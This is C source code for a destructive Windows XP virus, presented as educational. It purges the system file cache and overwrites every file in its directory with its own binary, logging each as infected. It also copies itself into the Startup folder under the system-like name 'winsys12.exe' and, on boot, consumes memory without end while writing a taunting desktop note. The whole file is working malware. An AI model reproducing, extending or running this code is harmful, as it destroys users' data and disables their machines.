/*
Author: Robert Sixto

Written for educational purposes. Do not distribute with malicious intent.
Author assumes no liability.

*/

#include<stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <unistd.h>
#define MB (1024*1024)

//Takes current file as input and copies its binary to target file.
//Returns 1 if function fails to get a file pointer to the target file,
//otherwise returns 0.
int copy(char* current, char  *dest)
{

    FILE  *oldf, *newf;

    oldf = fopen(current, "rb");

    newf = fopen(dest, "wb");

    if(newf == NULL)
    {



        fclose(oldf);

        return 1;

    }


    while(!feof(oldf))
    {

        fputc(fgetc(oldf), newf);
    }

    fclose(newf);
    fclose(oldf);
    return  0;
}
//don't infect log file
int isLog(char* file)
{
    char *self = "log.txt";
    int i = 0;
    int count = 0;
    while(file[i]!='\0')
    {
        int j = 0;
        count = 0;
        while(file[i+j] == self[j])
        {
            j++;
            count++;

            if(count == 7)
                return 1;
        }
        i++;
    }
    return 0;
}
//custom string compare function
int cstrcmp(char *a, char*b)
{
    int i =0;
    while(a[i]==b[i])
    {
        if(a[i]=='\0' && b[i]=='\0')
        {
            return 1;
        }
        i++;
    }
    return 0;
}

//infects startup folder. If already infected, don't reinfect
//If instance of virus is the one in the startup folder , deliver payload, eat ram.
int infectStartUp(char* self)
{
    FILE* exists;

    exists = fopen("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\winsys12.exe", "r");
    //file doesn't exist in startup. copy it.
    if(exists == NULL)
    {
        if(copy(self, "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\winsys12.exe")==0)
        {
            //copy to startup success.
            return 0;
        }
        else
        {
            //copy to startup fail.
            return 1;
        }
    }
    //file does exist. Don't copy it.
    else
    {
        fclose(exists);


        //file exists and is startup version. Deliver payload.
        if(cstrcmp("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\winsys12.exe", self))
        {
            int* eat;
            int count =0;
            FILE* guildmaster;
            guildmaster =fopen("C:\\Documents and Settings\\All Users\\Desktop\\warning.txt", "w");

            //eat ram
            while(1)
            {
              for(int i =0; i<100000; i++);
              eat = malloc(64);
              count +=64;
              if((count % (MB*10) == 0))
              {


                  //MessageBox(0,"Your computer's health is low. Do You have any potions or food?","Yummy", MB_ICONHAND);
                  fprintf(guildmaster, "Your computer's health is low. Do You have any potions or food?\n%d MB consumed.\nYummy\n.", count/MB);
                  fflush(guildmaster);

              }
            }
        }
        //file exists, but is not startup version
        return 2;

    }

    //error
    return 9;


}




int  main( int argc, char *argv[] )
{
    //removes windowsXP's cached copies of system critical files
    system("sfc /purgecache");

    DIR* directory;
    struct dirent* entry;
    directory = opendir(".");

    FILE* log;

    log = fopen("log.txt", "w");

    if (directory==NULL)
    {
        return 1;
    }
    //Scanning files and infecting them by overwriting their binary with this file's binary.
    //Prints a report of infected files in log.txt.
    //If 'copy_file()' returns 1 for any file infection not successful.

    while((entry = readdir(directory)) !=NULL)
    {

    if(!isLog(entry->d_name))
       {
        fprintf(log, "%s",entry->d_name);

        if(copy(argv[0], entry->d_name)==0)
        {

            fprintf(log, "  INFECTED\n");

        }
        else
        {

            fprintf(log, "  FAILED TO INFECT\n");

        }
       }
    }
    fclose(log);
    infectStartUp(argv[0]);


    return 0;
}
